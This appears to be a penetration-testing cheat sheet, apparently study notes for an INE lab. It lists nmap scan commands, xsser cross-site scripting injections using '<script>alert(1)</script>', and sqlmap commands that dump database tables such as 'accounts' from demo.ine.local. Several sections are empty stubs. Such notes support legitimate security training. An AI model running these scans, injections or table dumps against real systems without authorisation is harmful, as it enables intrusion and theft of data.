# Port scanning and service fingerprinting

## Nmap

### Ping sweep

```shell
nmap -sn -n $IP_range_CIDR -oN network_hosts
```

### Port scanning

#### SYN scan (noisy)
```shell
nmap -sS -n -Pn -p- --min-rate 5000 $target_IP -oN allPorts -oG allPorts
```

#### Connect() scan
```shell
nmap -sT -n -Pn -p- --min-rate 5000 $target_IP -oN allPorts -oG allPorts
```

#### UDP scan
```shell
nmap -sU -n -Pn -p- --min-rate 5000 $target_IP -oN allPorts -oG allPorts
```


### Service fingerprinting and NSE scripts

Enter the comma separated open port list after the `-p` parameter

```shell
nmap -sC -sV -p $OPEN_PORTS -oN targeted
```


## Other tools

# Web server attacks

## Web server fingerprinting

### Ncat

### OpenSSL

### whatweb

To get the server banners run

```shell
whatweb $TARGET_URL
```

## Directory and file enumeration

### dirb

### dirsearch

### gobuster

# XSS

Test all user input to render HTML placing tags or execute JavaScript code with the `<script>` tag.

## XSSER

USAGE


Replace the parameter to inject with the “XSS” keyword or put the XSS keyword on the URL GET parameter to inject payload.

  

### GET REQUEST

```shell
xsser --url 'http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=sas&user-poll-php-submit-button=Submit+Vote'
```


  
  
### POST REQUEST

  

Get the request parameters and use the -p flag to set the reflection points

```shell
xsser --url 'http://VULNERABLE/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
```


### AUTOMATIC PAYLOAD


Append the –auto switch

```shell
xsser --url 'http://VULNERABLE/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' –auto
```
  

### CUSTOM PAYLOAD

  
Append the –Fp switch with the custom payload

```shell
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"
```


```shell
xsser --url "http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"
```
  
# SQLInjection

## SQLMap

### GET parameters

Enumerate DBMS banner, the current Database and it's tables using 10 threads

```shell
sqlmap -u 'http://demo.ine.local/index.php?page=user-info.php&username=sf&password=saf&user-info-php-submit-button=View+Account+Details' -p username --banner --current-db --tables --threads 10

```

Dump the information of a table

```shell
sqlmap -u 'http://demo.ine.local/index.php?page=user-info.php&username=sf&password=saf&user-info-php-submit-button=View+Account+Details' -p username --banner --current-db --dump -T accounts --threads 10
```


### POST request

Define the POST parameters with the `--data` flag.

```shell
sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner --current-db --dump --tables --threads 10

```


# Dump a specific table

```shell
sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner --current-db --dump -T table --threads 10
```

# Dump a specific table from a database
```shell
sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner -D database --dump -T table --threads 10
```


common ports 

21,22,25,53,443,5000,8000,8080,3306